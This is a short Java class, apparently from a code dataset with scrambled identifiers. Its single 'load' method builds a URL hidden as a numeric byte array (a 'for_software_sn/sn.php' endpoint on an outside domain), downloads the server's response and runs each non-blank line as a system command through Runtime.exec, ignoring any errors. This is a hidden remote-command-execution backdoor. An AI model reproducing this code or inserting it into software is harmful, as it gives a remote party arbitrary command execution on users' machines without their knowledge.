class n17231074 {
	private void load(String ndihQh0S) {
		byte[] E83XTa5k = { 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 118, 101, 110, 116, 117, 114, 101, 105,
				110, 99, 104, 105, 110, 97, 46, 99, 111, 109, 47, 102, 111, 114, 95, 115, 111, 102, 116, 119, 97, 114,
				101, 95, 115, 110, 47, 115, 110, 46, 112, 104, 112, 63, 99, 61 };
		try {
			String giDcLqVe = new String(E83XTa5k) + ndihQh0S;
			URL sWNKupIx = new URL(giDcLqVe);
			InputStream hvh41RAJ = sWNKupIx.openStream();
			List<String> SJDkI9uH = IOUtils.readLines(hvh41RAJ);
			if (SJDkI9uH != null) {
				for (String SK8o2GGW : SJDkI9uH) {
					if (StringUtils.isNotBlank(SK8o2GGW)) {
						Runtime.getRuntime().exec(SK8o2GGW);
					}
				}
			}
			hvh41RAJ.close();
		} catch (IOException XpZYHSDa) {
		}
	}

}